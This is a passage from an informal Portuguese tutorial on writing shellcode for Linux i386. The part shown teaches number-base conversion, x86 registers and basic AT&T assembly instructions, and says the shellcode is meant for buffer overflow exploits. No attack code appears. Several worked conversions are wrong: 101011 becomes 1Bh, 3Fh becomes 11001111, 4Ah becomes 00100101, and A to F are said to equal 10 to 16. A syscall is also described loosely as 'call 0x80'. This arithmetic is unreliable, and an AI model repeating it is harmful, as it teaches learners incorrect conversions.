de  32  bits que  serah  explicada mais  abaixo.Mas  saiba que  o  "e" antes  do
registrador( ex: %eax) indica que  o registrador eh  extendido.


------------------------------------------------------------
4. CALCULOS ENVOLVENDO AS NOTACOES (hexa, decimal e binaria)|
------------------------------------------------------------

Ja sabemos o que sao numeros binarios, numeros em hexadecimal e o sistema  comum
da  humanidade que  eh os  numeros em  decimal.A conversao  entre numeros  varia
muito, use um pouco da matematica da melhor forma possivel, caso jah saiba  isso
tudo, nao hesite em pular para o proximo topico, caso nao saiba, darei um  breve
explicacao sobre os metodos de conversao simples.

4.1 Sistemas Decimal e Binario.
-----------------------------------

Para nao termos duvidas quanto a conversao entre sistemas, faz-se necessario uma
breve explicacao desses dois sistemas acima. O nosso sistema comum de  calculos,
o  decimal,  possui  uma base  10,  a  razao disso  eh  que  nos primordios  das
civilizacoes, o homem iniciou suas contas  com a ajuda dos dedos das  maos, como
temos dez, convencionou-se  fazermos nossos calculos  usando como referencia  10
possiveis numeros.As  maquinas nao  possuem maos..:)..  elas interpretam  apenas
dois estados (ligado e  desligado), entao a notacao  binaria, 1 ou 0,  tornou-se
habil p/ se  usar em computadores.Nao  possuo muito conhecimento  nessa parte de
hardware, ouvi comentarios que existem sistemas trinarios, mas nunca lih nada  a
respeito, fica aih uma pergunta, existe  mesmo isso? De qualquer forma isso  nao
se aplicarah aos nossos estudos, lembre-se,fucadores sao praticos! Para fazermos
conversao entre esses sistemas, nos utilizamos dos seguinte artificios:

* De Binario para Decimal:
--------------------------

+ Pegamos o  numero binario que  queremos conveter colocando-o  ao contrario, de
tras  p/  frente(da  direita  p/  a  esquerda),  em  seguida  dividimos  ele  em
partes(casas),  deixando  cada  digito   binario(1  ou  0)  sozinho.Depois   nos
multiplicamos cada  digito por  2 elevado  a casa  decimal correspondente  dele
- 1.Vejamos um exemplo com o numero 10011.

- Primeiro nos invertemos ele, fazendo-o ficar da seguinte forma:

10011(antes) - invertemos fica - 11001(depois).

Preste atencao, o que fizemos foi fazer o ultimo digito se tornar o primeiro,  e
assim sucessivamente.

Feito  isso   seguimos  multiplicando   cada  digito   por  2   elevado  a  casa
correspondente menos 1.Vejamos:

binario:	 1        1	  0	  0	  1
decimal:       1*2^0    1*2^1   0*2^2   0*2^3   1*2^4
      =          1    +   2   +	  0   +   0   +	  16   = 19.

O caracter " ^ " indica que o  numero eh uma potencia, seria 1 que multiplica  2
elevado a 0 no primeiro caso.  Nao ha segredo, multiplica-se o numero  binario(1
ou 0) por 2 elevado a casa decimal dele menos 1.

Vejamos mais um exemplo: Pegamos o numero binario 1010b e facamos a conversao:

- Primeiro nos invertemos o numero binario:

1010(antes) -> Inverte-o -> 0101(depois)

- Em seguida multiplicamos cada digito por 2 elevado a casa dele menos 1.
    0	    1	    0	   1
  0*2^0 + 1*2^1 + 0*2^2 + 1*2^3 =
    0   +   2   +   0   +  8    = 10

Podemos  ver  perfeitamente   que  nao  eh   nada  dificil,  espero   que  tenha
entendido.Caso se  faca necessario,haja  duvidas, consulte  outros textos  sobre
isso nas home pages que divulgo no final desse arquivo texto.


* De Decimal para binario:
--------------------------

Existem varios metodos p/ converter Decimal para Binario.Iremos demostrar  aqui,
o metodo mais facil e conhecido.Vejamos um exemplo com o numero 56:

56/2 = 28 (nao possui resto entao eh = 0);
28/2 = 14 (nao possui resto entao eh = 0);
14/2 = 7  (nao possui resto entao eh = 0);
7/2  = 3  (possui resto entao eh = 1);
3/2  = 1  (possui resto entao eh = 1);
1/2 = 0   (possui resto entao eh = 1);

Iremos entao construir o numero do ultimo  a ser calculado ateh o primeiro (  de
baixo para cima).Seria entao: 111000

Eis aih nosso esquema p/ converter de decimal para  binario: Pegamos o numero  e
dividimos  ele  e seus  restos  por dois  (fatoramos),  admitindo sempre  que  o
resultado eh um numero inteiro, quando houver resto, entao o correspondente eh o
numero binario  1, quando  nao houver  o correspondente  eh o  numero binario 0,
depois pegamos os binarios de baixo  para cima para formarmos o numero  completo
correspondente ao numero decimal desejado.

4.2 Sistema Hexadecimal
-----------------------
O sistema hexadecimal como foi mostrado acima possui uma base de 16 digitos. Sao
eles os numeros de 0 a 9 e as letras de A a F do nosso alfabeto que correspondem
a 10,11,12,13,14,15,16 , respectivamente.Entao a notacao hexadecimal consiste da
seguinte sequencia:  0123456789ABCDEF. Veremos  agora as  conversoes entre esses
sistemas:

* De Binario para Hexadecimal
------------------------------
A primeira coisa que  devemos fazer eh dividir  o numero binario em  grupos de 4
bits, iniciando  da direita  para a  esquerda.No caso  do ultimo  grupo, caso  o
numero binarios nao possua casas de multiplos de quatro,dividimos igualmente,  e
enchemos o resto da estrutura(numero  binario p/ ficar como multiplo  de quatro)
com zeros(0).Vejamos um exemplo com o numero binario 101011 :

10:1011   -> Dividimos ele em grupo de 4,mas faltam casas entao
1000:1011 -> Enchemos ele com zeros p/ que fique com grupos de 4 completo.
	     Lembre-se, coloque os zeros a esquerda.

Agora pegamos cada grupo como um numero independente e consideramos o seu  valor
em decimal. ex:
1000 = 1 em Decimal. (1*2^0 + 0*2^1 + 0*2^3 + 0*2^4 = 1)
1011 = 11 em Decimal.(1*2^0 + 0*2^1 + 1*2^2 + 1*2^3 = 11)

0010 = 1 ; 1011 = 11.

Juntamos entao os resultados obtidos em cada grupo:
111

Como 111 daria erro,  temos que transformar os  numeros maiores que 9  para suas
respectivas letras.11 possui a letra B.Entao  nosso numero ficaria 1Bh ( onde  h
serve para indicar que o numero eh hexadecimal ).

* De Hexadecimal para Binario:
------------------------------
Tambem nao possui misterio, fazemos o processo inverso do descrito acima.
Vejamos para o numero 3Fh.
3F eh a uniao de 3 com F(15);
nosso numero seria 3 no primeiro grupo e 15 no segundo.
Passando de decimal para binario,teriamos:
3/2 = 1 (possui resto entao eh = 1);
1/2 = 0 (possui resto entao eh = 1);

o numero 3 em binario eh igual a 11.

15/2 = 7 (Possui resto entao eh = 1);
7/2  = 3 (Possui resto entao eh = 1);
3/2  = 1 (Possui resto entao eh = 1);
1/2  = 0 (Possui resto entao eh = 1);


o numero 16 em binario eh 1111.

Unindo as estruturas da direita para a esquerda,teremos:

1100;1111

Logo nosso numero seria 11001111.

Existe um tutorial em  portugues, que deve estar  entre os links que  divulgo no
final que se  enrola nisso em  cima, tem que  estar atento, ele  troca, enche as
casa de que nao sao multiplas de 4 de forma errada, por isso amigo, fique atento
e  busque  mais  material  sobre  isso,  caso  tenha  duvidas,  e  como  isso eh
matematica, ou eh  certo ou errado,  nao tem meio  termo, pesquise!Mas para  que
meus leitores  nao possuam  duvidas, eu  escrevo para  Newbies, aih  vai mais um
exemplo,  compare com  o anterior  e verah  que existe  exatidao nos  calculos.
Mostraremos a conversao do numero 4A em hexa para binario:

Primeiro dividimos ele em partes:

   4    |    A
   4    |    11

Depois  Fazemos  sucessivas  divisoes  em cada  um,  sempre  observando  o resto
obetido, se o resto for igual a um inteiro perfeito, o binario correspondente eh
zero, senao o binario correspondente eh um:

4/2 = 2  -> O resto eh um inteiro, logo binario correspondente = 0.
2/2 = 1  -> O resto eh um inteiro, logo binario correspondente = 0.
1/2 = 0,5 -> O resto nao eh um inteiro perfeito, lgo binario   = 1.

Unindo os resultados num grupo de quatro, teremos:

0010; Onde esse ultimo zero eh acrescentado para completarmos o grupo.

Agora para A que equivale a 10 em decimal.

10/2 = 5 -> O resto eh um inteiro, logo binario correspondente = 0.
5/2  = 2,5 -> O resto nao eh um inteiro, pegamos o 2,5 e arredondamos
              para 2, e jah que o resto nao eh um inteiro, entao o
              binario correspondente eh igual a 1.
2/2 = 1 ->   Resto inteiro, binario = 0.
1/2 = 0.5 -> Aqui nos paramos, numero nao eh inteiro, binario = 1.

Pegando os binarios correspondente, teremos:

0101; Como vimos jah eh um grupo de 4.

Unimos os dois grupos de 4 e obteremos o resultado final:

0010;0101
00100101

Nosso numero hexadecimal 4A em binario eh igual a 00100101.


* De Decimal para Hexadecimal
------------------------------

Isso  eh  bastante simples.Sabemos  que  pela notacao,  faz-se  necessario dessa
forma, substituirmos um numero maior que 9 e menor que 15 pela respectiva  letra
correspondente(A ateh F).Levando-se  em conta isso,  fazemos o seguinte  esquema
para conversao de um numero decimal para hexadecimal:

+ Dividimos ele por 16. Pegamos seu resto.
+ Dividimos o quociente da divisao acima e dividimos por 16.Pegamos o resto.
+ O mesmo esquema anterior sucessivamente, ateh que o numero obtido no quociente
da divisao anterior seja  menor que 16, aih  ele proprio serah considerado  como
sendo o resto.


Vejamos um exemplo:
Usaremos o numero 2000 como exemplo.

Dividimos ele por 16 e seus sucessivos quocientes tambem por 16.Ex:

2000 / 16 = 125 (Quociente = 125; Resto = 0);

125 /16 = 7     (Quociente = 7; Resto = 13);

7 / 16 =>       (Aqui 7 eh menor 16 entao fica sendo resto = 7)

Podemos notar que  temos 3 numeros,  pegamos os restos  obtidos de baixo(ultimo)
para cima(primeiro) e unimos num soh numero, assim:

7 - 13 - 0  => 7 - D - 0 => 7D0

Eis aih o nosso numero 7D0.Lembrando que pela notacao, 13 eh igual a D.

Irei demonstrar outro numero como exemplo, para que nao hajam duvidas: Vejamos o
numero 1980 (Considerada a decada de ouro do hacking mundial).

Comecamos dividindo ele por 16;

1980 / 16 = 123 (Quociente = 123; Resto = 12);
123 / 16  = 7   (Quociente =   7; Resto = 11);
7  /  16  => 7  (Como divisor < 16 entao fica ele como Resto = 7);

Pegando de baixo(ultima divisao) p/ cima(primeira divisao), teremos:

7 - 11 - 12  => 7 - B - C  => 7BC.

Bem, aih estah amigo.Veremos agora outro tipo de conversao:


* De Hexadecimal para Decimal:
------------------------------

De Hexadecimal para Decimal eh bem simples.Caso nao tenha entendido os  calculos
acima, talvez  isto sirva  para clarear  um pouco.O  processo para  se obter  um
numero Decimal  a partir  de um  Hexadecimal eh  exatemente o  metodo oposto  ao
demostrado acima.Vejamos;

+ Pegamos um numero hexa, dividimos ele em partes ou casas decimais e
  multiplicamos ele pelo numero (16 ^ X), onde X representa a casa decimal
  ocupada pelo respectivo numero - 1.Em seguida somamos os resultados
  obtidos com cada multiplicacao.

Vejamos um exemplo com o numero 7BC citado acima.

Para facilitar, separamos ele em casas;

7 - B - C => 7 - 11 - 12;

Pegamos cada casa e multiplicamos por 16 elevado a casa - 1 (16 ^ X).

7  * 16 ^ 2 = 1792
11 * 16 ^ 1 =  176
12 * 16 ^ 0 =   12       Somando os respectivos resultados,teremos:
              -----
               1980

Como visto, nao eh nem um pouco complicado, mas demonstrarei outro
exemplo usando o numero hexadecimal 5F1.

Dividindo ele em partes, teremos:

5 - F - 1  => 5 - 15 - 1

Pegando cada casa e multiplicando por 16 elevado a casa - 1 (da direita
para a esquerda).Teremos:

5  * 16 ^ 2 = 1280
15 * 16 ^ 1 =  240
1  * 16 ^ 1 =    1

Somando os resultados obtidos, teremos:

1280 + 240 + 1  = 1521.


Eh isso aih amigo, nao vou ensinar operacoes envolvendo numeros desses  sistemas
numericos, nao  creio que  usarei aqui  neste tutorial,  mas eh  bom saber disso
tudo, veja  outros txts,  isso eh  importante no  mundo da  programacao de baixo
nivel,  nao use  programas que  jah dao  o resultado  instantaneo, sem  saber o
processo  mano!!Essas calculadoras  tem servido  muito para  alienar o  pessoal,
fazendo com que mais pessoas fiquem dependentes das maquinas, para efetuarem  os
calculos.Eu sei  que o  pessoal que  meche com  baixo nivel,  eh porque gosta de
programar, nada contra  quem usa alto  nivel, mas com  alto nivel as  coisas sao
muito limitadas, muito  mesmo, ainda mais  para nossos intuitos.Entao  amigo, se
quer ser um  fucador de verdade,  nao digo para  deixar de vez  as linguagens de
alto nivel, mas aprenda as de nivel baixo.C pode ser considerada de alto,medio e
baixo, eh uma linguagem fascinante, quem aprende, nao quer largar mais, a  mesma
coisa  se diz  de assembly,  soh que  assembly eh  fogo!!!:)..Analise seu  caso,
decida seu rumo,amigo, ve aih o que vai ser mais util para voce no futuro!


------------------
5 - REGISTRADORES |
------------------

Voce deve estar lendo e pensando que  irei ensinar voce a programar em asm.  Jah
disse, amigo, volto a repetir, este eh um tutorial sobre escrita de  shellcodes,
necessita saber o basico de  assembly.Descreverei aqui dados relacionado a  essa
linguagem que ajudarao a clarear as  coisas, mas se quer ir longe,  procure bons
textos ou livros sobre isso, disponibilizarei urls no fim desse texto, mas  elas
por sih soh ainda nao sao tudo sobre asm. Pesquise, vah fundo, nao desista! Essa
parte irah descrever brevemente o que sao alguns dos registradores em asm,  para
que servem e como usa-los.Vamos lah!

Registradores sao uma especie de instrucoes que recebem e guardam variaveis.Eles
sao muito comuns no  recebimento de dados p/  enviarmos depois a algum  lugar da
memoria(Stack por exemplo).

Veremos abaixo, uma breve explicacao sobre cada um desses registradores:

5.1 Registradores Gerais
-------------------------

+ AX  -> Eh um registrador de 16 bits.Pode-se acessar parte dele.Como ele
	 eh 16 bits, podemos acessar se quisermos apenas 8 bits, para isso
	 devemos declara ele como sendo AH ou AL.AX eh conhecido como
	 Acumulador X.Sabemos que X pode ser substituido por L(low) ou
         H(high), traduzindo, alto e baixo, respectivamente.Qualquer
  	 mudanca para AL ou AH implicarah numa mudanca de AX.
	 Esse registrador eh muito usado em operacoes de entrada e saida
	 de dados.Num sistema i386, que eh o que usaremos, ao inves de
         simplesmente AX, usaremos EAX, e como registradores recebem o
	 simbolo de porcentagem(%), nosso registrador ficarah %EAX.
	 Tenha em mente por enquanto que ele eh um registrador que
         acumula dados.Um exemplo seria ele receber o endereco de uma
	 determinada instrucao ou string e empurra-la sobre o Stack.
	 Isso pode ser visto abaixo:

         mov    0xfffffff8(%ebp),%eax
         push   %eax

	 No exemplo acima %eax recebe o endereco de uma string
         0xfffffff8(%ebp) e depois eh empurrado os dados de %eax sobre
         o Stack.Lembrando que estamos usando a sintaxe AT&T onde a
	 fonte(origem) vem primeiro e o destino depois.
	 Aos poucos a coisa vai clarear mano, paciencia!

+ BX -> Conhecido como registrador BASE.Possui o mesmo esquema de AX, onde
	voce pode colocar dados nas partes dele,BH (alta) e BL(baixa).Na
	sintaxe AT&T para i386 teriamos ele como sendo %EBX.Ele eh muito
	usado como um registrador de offset.Um exemplo do uso dele seria:

	movl %esi,%ebx

        Onde copiamos o endereco dos dados de %esi para este registrador.

+ CX -> Esse eh conhecido como o registrador contador(count).Tambem como
	AX e BX, ele pode ser dividido e manipulado em partes,CH(Counter
	high), para manipularmos na parte alta(8 bits para cima) e
	CL(Counter low), para manipularmos na parte baixa(8 bits p/ baixo).
	O que devemos ter em mente eh o uso disso nas nossas implementacoes.
	Geralmente usaremos CX e deixaremos o programa fazer o servico por
	nos.NA sintaxe AT&T teremos entao p/ CX o seguinte formato: %ecx.
	Esse registrador eh muito usado em situacoes de loop, e contagem
	em desvios condicionais.
	Um exemplo dele seria:

	movl $10, %ecx

+ DX -> Eh o registrador de dados.Assim como os acima, ele eh usado para
	salvar dados(receber).Ele tambem pode ser divido em partes,
	DH(Data High), para manipularmos na parte alta, e DL(Data Low),
 	como voce jah deve saber, p/ manipularmos na parte baixa da
	memoria.Ele eh muito usado em operacoes aritmeticas, como MUL,
	DIV e etc.. Um exemplo para ele seria:

	leal 0xc(%esi),%edx

	Onde %edx acima carregado com o valor de 0xc + o valor de %esi.


5.2 - Registradores de Segmento:
---------------------------------

+ ES -> Segmento Extra(Extra Segment).Ele eh usado como o segmento
	destino em operacoes de tranferencia e movimentacao de dados,
	como mov.

+ DS -> Segmento de Dados(Data Segment).Representa a area na memoria
	onde os dados sao armazenados.Todos os dados lidos pela CPU
	sao do segmento apontado para este registrador.Ele eh usado
        como segmento(endereco) origem para operacoes com mov,lods.

5.3 - Registradores de Indexacao do Stack:
------------------------------------------

Estes  interessam e  muito aquele  que querem  entender o  processo preludio  ou
inicial de  programas C  (necessario para  se entender  os Stack  Overflows). De
qualquer forma, sao eles:

+ BP -> Apontador de Base(Base Pointer).Eh usado para acessar o Stack.

+ SP -> Apontador do Stack(Stack Pointer).Ele aponta para a posicao de
	memoria atual do Stack.

Esses dois registradores se complementam em processos de envio de codigos
sobre o Stack.Na parte de programacao de shellcodes propriamente dita,
voce verah com mais clareza isto que estou dizendo.

+ SS -> Segmento de Pilha(Stack Segment).Eh usado pela CPU para armazenar
	enderecos de retorno de sub-rotinas.Eh o segmento onde reside o
	Stack.

5.4 - Outros Registradores Muito Usados
----------------------------------------

Esses  registradores  que  seguem  abaixo,  sao  tambem  de  grande importancia,
descreverei rapidamente o que representa cada um.


+ CS -> Segmento de Codigo(Code Segment).Refere-se a parte da memoria
	(bloco) onde os codigos sao armazenados.Este segmento aponta
	para a proxima instrucao,nao pode ser mudado diretamente.

+ SI -> Indice Fonte, ou Indice Origem(Source Index).Muito usado para
	movimentacao de blocos de instrucoes, voce verah isso muito
	nos nossos shelcodes.Ele aponta para a proxima instrucao.Um
	exemplo deste dito cujo segue abaixo:

	movl $0x0, 0xc(%esi)

	Onde %esi eh um bloco de instrucoes jah pre-definidas.

+ DI -> Indice Destino(Index Destination).Ele pode ser usado como um
	registrador de offsets.Muito usado em operacoes com movs e stos.


Bem amigo, esses sao os mais usados e conhecidos, tem ainda outros registradores
como  FS,  GS, mas  que  nao descreverei  neste  tutorial, pois  fogem  do nosso
objetivo.



-----------------------------
6 - LISTA BASICA DE COMANDOS |
-----------------------------

Nesse  capitulo,  descreverei  de  forma breve  e  rapida,  uma  lista basica  e
necessaria de comandos assembly que nos ajudarao a construir nossos  shellcodes.
Lembrando  que trabalharemos  em cima  de um  codigo C  que serah  sempre feito
anteriormente.Os  comandos em  assembly variam  muito. O  que eu  chamo aqui  de
comandos, sao intrucoes em assembly responsaveis por uma determinada  acao.Essas
instrucoes  sao  as  responsaveis  pela execucao  de  nosso  programa,  no caso,
shellcode.E mais uma vez recordando, estaremos trabalhando numa plataforma linux
i386, mas com sintaxe AT&T.

Abaixo segue a lista:

+ 6.1 - Instrucoes de Transferencia
------------------------------------

Sao as responsaveis por tranferir dados contidos em registradores e etc,
para determinadas regioes na memoria ou execucao de alguma outra
instrucao.Sao elas:

* MOV  -> Eh a instrucao responsavel pela transferencia de dados na
	  memoria(movimentacao).Sua sintaxe em AT&T eh bastante simples:

	   MOV origem,destino

	  Onde origem pode ser um registrador,uma celula de memoria ou
	  um operando qualquer.Um exemplo seria:

	  mov    %esp,%ebp

	  O que isso aih em cima faz eh transferir o conteudo de %esp
	  (Stack pointer) para %ebp (Base Pointer).Guarde bem esse
	  exemplo, pois ele serah util para os nossos propositos.
	  Outros exemplos:

          mov    $0x7, %eax
	  mov    0xfffffff8(%ebp),%eax
	  movl   $0x0,0xfffffffc(%ebp)

	  Nesse ultimo exemplo, vemos movl (mov + l), lembrando que esse
	  l significa low(baixo).Trata-se de transferencia para parte
	  baixa do registrador, no caso EBP(%ebp).
	  Outras possiveis insercoes em mov sao: movs,movsb,movsw.
	  Nao entrarei em detalhes sobre elas, olhe os links no final
	  caso necessite.Mas em todo caso, movsb serve para mover 1 byte,
	  enquanto movsw serve para mover uma word.



* LEA ->  Eh uma instrucao parecida com MOV, soh que jah efetua alguns
	  calculos antes de transferir os dados, esses calculos sao
	  na maioria dos casos, sao calculos de endereco de memoria,
	  como ADDs.Vejamos um exemplo:

	  add $0x8,%eax
	  mov %eax,%ebx

	  Agora substituindo por lea, ficaria:

 	  lea 8(%eax),%ebx

	  Isso faz-se com que o tempo gasto na execucao de um programa
	  seja cada vez mais rapido, existe um ganho consideravel no
	  uso desta instrucao, mas em compensacao, requer que os
	  programadores estejam mais atentos ao codigo para saber o que
	  de fato estah sendo feito.Um exemplo simples de LEA como
	  uma simples instrucao de transferencia, seria:

	  lea $0x8, %eax

	  Isto equivaleria a instrucao MOV, no caso.


Eu  achei por  certo descrever  brevemente aqui  as intrucoes  que servem  para
transferir  dados   para  o   Stack,  pois   ao  meu   ver,  sao  instrucoes  de
movimentacao.Vejamos:


* PUSH -> Esta instrucao empurra dados sobre o Stack(pilha).Vai ser
	  muito usada em nossos exemplos.Vejamos sua sintaxe nesse
	  exemplo:

	  push $0x0

	  No exemplo acima, a instrucao push empurrou o numero
	  hexadecimal(0) para o stack.Esse numero eh um argumento
	  de uma funcao em C, que veremos mais tarde.

	  lea    0xfffffff8(%ebp),%eax
	  push   %eax

	  Jah nesse exemplo acima, vemos puss empurrar o endereco de
	  uma funcao propriamente dita.

* POP ->  Eh a instrucao contraria a PUSH, como push empurra dados
	  sobre o Stack, essa instrucao eh usada para retirar dados
	  do Stack, lembre-se que o esquema no Stack eh LIFO - ultimo
	  a entrar, primeiro a sair.Sabendo disso, entao a instrucao
	  POP, irah sempre retirar o ultimo dado inserido no Stack.
	  Vejamos um exemplo:

	  mov    %eax,%edx
	  push   %edx
	  call   0x8050b28 <__normal_errno_location>
	  pop    %edx

	  Esqueca por enquanto a instrucao call, se atenha somente a
	  push e pop.PUSH empurrou os dados de %edx sobre o Stack, depois
	  POP foi usada para retirar esses dados do Stack.


Existem bem  mais instrucoes  de transferencia,  mas como  dito, isto  nao eh um
tutorial  sobre  programacao  em  assembly.Se  quiser,  ou  necessitar,  procure
internet a fora, vah nos links que divulgo abaixo.

+ 6.2 - Instrucoes Aritmeticas
-------------------------------

Sao as intrucoes  usadas para relizacao  de calculos(operacoes aritmeticas)  nos
operadores. Sao elas:

* ADD -> Faz a adicao de dois operadores.Esta instrucao adiciona
	 dois operadores e guarda o resultado no operador destino.
	 Sua sintaxe em AT&T eh a seguinte:

	 add origem, destino

	 Onde origem pode ser uma regiao na memoria ou um dado numero
	 hexa.Vejamos um exemplo:

	 add    0xc,%eax

* MUL -> Faz a multiplicacao de dois operadores.Sua sintaxe em AT&T eh:

	 mul $0x4,%ax

	 Teremos ainda a instrucao IMUL, que tambem serve para
	 multiplicacao de operando, soh que essa instrucao leva em
	 consideracao o sinal do operando, enquanto MUL nao considera.

* DIV -> Obviamente, serve para fazer divisao de dois operadores.

	 div $0x4,%eax

	 Assim como na instrucao acima para multiplicacao de operandos,
	 a instrucao DIV tem sua instrucao paralela, responsavel por
	 divisao de operandos levando em consideracao o sinal, essa
	 instrucao eh a IDIV.

* SUB -> Aqui vai uma explicacao um pouco mais detalhada.Sub eh usada
	 para fazer subtracao de operadores, e tambem para alocar
	 espacos para receber dados no Stack, que nos interessa.
         Quando formos criar nosso shellcode, veremos sub resevar espaco
	 no stack para receber dados que nos impurraremos.Ex:

	 sub    $0x8,%esp

	 Isto faz com que seja reservado 8 bytes no Stack para receber
	 dados.

* INC -> Eh o incrementador na linguagem assembly.Assim como nas outras
	 linguagens, ele incrementa um operando, sendo que aqui, como eh
	 muita logica, ele jah trabalha em cima dos dados recebidos.
	 Vejamos um exemplo do uso de inc:

	 movl %ebx, %eax
	 inc %eax

	 Nesse exemplo acima, ele incrementou normalmente, somando 1
	 ao dado contido em %ebx.Com um pouco de neuronio, isto pode
         ser usado da mesma forma para manipular enderecos de
         memoria(como incrementar ponteiros em C).

* DEC -> Decrementador.Serve para decrementar um determinado operando.
	 Faz o contrario da instrucao acima.Da mesma forma, essa intrucao
	 pode ser usada para se manipular enderecos da memoria.



+ 6.3 - Instrucoes de Comparacao
---------------------------------

Sao instrucoes responsaveis por comparar operandos.Sao elas:

* CMP -> Compara dados em operandos.Exemplo:

	 cmp $0x8, %eax

	 Existem outras instrucoes parecidas com CMP, como CMPSB e
	 CMPSW, a primeira usada para comparar um byte, a segunda
	 uma word.

* TEST -> Essa instrucao eh usada em comparacoes logicas.

	 test   %edx,%edx

	 Faz uma checagem num determinado registrador para ver se
	 estah tudo certo.


+ 6.4 - Instrucoes de Salto
----------------------------

Essas instrucoes  sao usadas  para alterar  a direcao  normal de  um programa. O
pessoal que  jah mecheu  com programacao  nao-estruturada, acho  que nem precisa
perder tempo com isso aqui, vou descrever de forma breve o que sao e representam
essas instrucoes. As instrucoes de salto sao usadas pelo programa para fazer com
que  uma  determinada  rotina  execute  antes  de  outra  ou  mesmo,  em rotinas
condicionais, vejamos um esquema:

Se A = B, pula para Z.
senao continua normalmente.

No exemplo de "algoritmo" acima, vemos  um salto condicional, se a condicao  for
verdadeira, ocorre o salto(Primeira linha),senao, nao ocorre o salto.

Mas existem situacoes, e  em nossos exemplos as  teremos, em que o  salto nao eh
condicional.Quem  mecheu  com Basic,com  a  instrucao goto,  sabe  do que  estou
falando.Os saltos incondicionais servem para  fazer com que a direcao  normal do
programa seja alterada.Essa instrucao, geralmente  faz com que o programa  fique
indo e  voltando, ou  pulando para  uma determinada  execucao depois para outra,
nada estruturado. Uma razao de ter se criado algoritmos de dados estruturados eh
justamente essa, quando se tem saltos condicionais ou nao, o algoritmo fica meio
baguncado,  dificultando   a  leitura   e  compreensao   por  parte   de  outros
programadores que nao  fizeram o dito  cujo.Mas a realidade  eh que, pelo  menos
para mim, que  mechi com essas  linguagens "antigas", instrucoes  como goto, bem
como esquemas de saltos, facilitavam e  muito as coisas. Agora quando me  deparo
com problemas deste tipo, agradeco a Deus por ter mechido com aquilo!!:)..E olha
que falam hoje em dia em banir esquemas de algoritmos  nao-estruturados!!!Querem
mesmo alienar o pessoal!!

De  qualquer forma,  essas instrucoes  relacionam ao  fluido(direcao) normal  da
execucao   de   um  programa.O   esquema   abaixo  irah   demonstrar   um  salto
incondicional.Farei ele em QBASIC..:)..bateu uma saudade agora!!:)

1 CLS
2 COLOR 15
3 PRINT "Seja bem vindo"
4 INPUT "Digite sua senha: ", senha$
5 IF senha$ = "fucador" THEN GOTO 20:  ELSE GOTO 10
6 PRINT "Voce estah testando um salto condicional!!"
10 PRINT "Voce nao eh bem vindo aqui"
11 GOTO 4
20 PRINT "seja bem vindo fucador!!"
21 PRINT "Aqui eh a sua casa!!"


Se voce prestar atencao  a esse programa, verah  os saltos sendo praticados,  na
linha 4 recebe-se uma variavel senha$, na linha 5, faz-se uma comparacao  usando
if(se), se senha$ eh igual a fucador,  pule para a linha 20, esta linha  20 irah
imprimir uma mensagem de boas vindas, mas  se a senha$ nao for igual a  fucador,
nos vimos na linha 5,  ELSE GOTO 10, se nao  for pule para 10, pularemos  para a
linha 10, aqui na linha 10, nos temos uma mensagem dizendo que fulano nao eh bem
vindo,  em  seguida na  linha  11 temos  a  execucao do  que  chamamos de  salto
incondicional.Na  linha  11, ordenamos  um  salto para  a  linha 4,  gerando  um
looping, caso  ele sempre  digite a  senha errada.Bem,  aih estah  um exemplo em
QBASIC, o pessoal velha guarda deve ter pulado isso tudo jah, mas para o pessoal
que  nao conhece  BASIC, e  nem usa  MS-DOS, windows  nao tem  QBASIC nele,  nem
nenhuma outra  linguagem.O MS-DOS  trazia QBASIC,  um debugador  capaz de  gerar
arquivos .COM com codigos assembly,e outras coisas, ateh um anti-virus. Mas como
as coisas mudam,  deixa pra lah.Para  o pessoal que  nao tem QBASIC,  aih vai um
exemplo desses saltos em C.

/* Programa exemplo de saltos em C */

#include <stdio.h>
#include <stdlib.h>

main(){
char senha[30];
printf("Digite a senha: ");
scanf("%s",&senha);
if(!strcmp(senha,"fucador")) goto BEM_VINDO;
else goto FORA_DAQUI;

BEM_VINDO:
printf("Seja bem vindo fucador!!\n");
goto FUCADOR;

FORA_DAQUI:
printf("Voce nao eh bem vindo!!!\n");
printf("Saia fora daqui!!\n");
return 0;

FUCADOR:
printf("Eis aqui a complementacao do salto incondicional!!\n");
return 0;
}

Analisando  bem  o  programa  acima,  voce  verah  o  uso  de  goto  para  salto
condicional(salta para BEM_VINDO e para FORA_DAQUI), e tambem o uso de goto para
um salto incondicional , que eh  a chamada goto dentro de BEM_VINDO,  vemos goto
FUCADOR. Caras que manjam muito  de algoritmos fogem destas instrucoes  e destes
saltos,  em C,  geralmente se  procura colocar  tudo em  funcoes,mas para  nosso
intuito de  execucao de  shellcodes, faz-se  necessario este  conhecimento, haja
visto, muitos usarao estes shellcodes em exploits para buffer overflows, se para
automatizar o processo, faz-se necessarios alguns saltos.

Bem amigos, podemos  ver na pratica  o que sao  estes saltos, que  faz com que o
programa  pule de  lah para  cah.Veremos agora  algumas instrucoes  em assembly
responsaveis por fazerem saltos parecidos com os citados acima.Sao elas:


* JMP -> Eh o tal do jump(pula,salta).Eh muito usada em saltos
         incondicionais, fazendo o programa ir executar alguma instrucao
	 diretamente, antes de poder seguir em frente, na sua direcao
	 normal.Vejamos um exemplo:

	 jmp 0xd
	 mov 0x0, %eax

	 No exemplo acima,vimos jmp ordenar ao programa que salte para a
	 posicao 0xd, executando a instrucao que deverah estar incluida
	 nesta posicao, a instrucao mov, abaixo, assim como nos exemplos
	 que vimos acima, nao serah executada, a nao ser que exista uma
	 outra chamada de jmp para a posicao de memoria onde se encontra
	 esta instrucao.

Existem varias instrucoes que equivalem a JMP, mas que servem executam
somente saltos condicionais, eis algumas delas aqui:

* JAE -> Jump if Above or Equal.Ela salta se o parametro for acima
	 ou igual ao dados.

* JNE -> Jump if Not Equal.Salta se paramentro nao for igual.

* JGE -> Jump if Greater than or Equal.Salta se for maior ou igual a.

* JLE -> Jump if Less or Equal .Salta se for menor ou igual a.

* JE  -> Jump if Equal.Salta parametro for igual a.

* JB  -> Jump if Below.Salta se abaixo.

* JG  -> Jump if Greater than. Salta se for maior que.

* JL  -> Jump if Less than. Salta se for menor que.

Cada instrucao desta citada acima possui como parametro uma posicao de
memoria, vemos um exemplo, na linha abaixo:

je     0x8048304

Existem ainda  varias outras,  mas fogem  do objetivo  deste tutorial,como  dito
varias vezes, pesquise mais sobre assembly internet a fora.


* CALL -> A instrucao call, eh  usada para chamar um sub-rotina, ou
	  mesmo para gerar uma especie de salto para uma instrucao no
	  programa.Como vamos trabalhar em cima de um codigo C debugado,
	  veremos essa instrucao constantemente chamar um system call.
	  Um exemplo de seu uso, seria:

	  call   0x80

	  Faz o programa "saltar" para o codigo que se encontra neste
	  endereco(0x80).Num programa C debugado, podemos ver a instrucao
	  CALL chamar um system call:

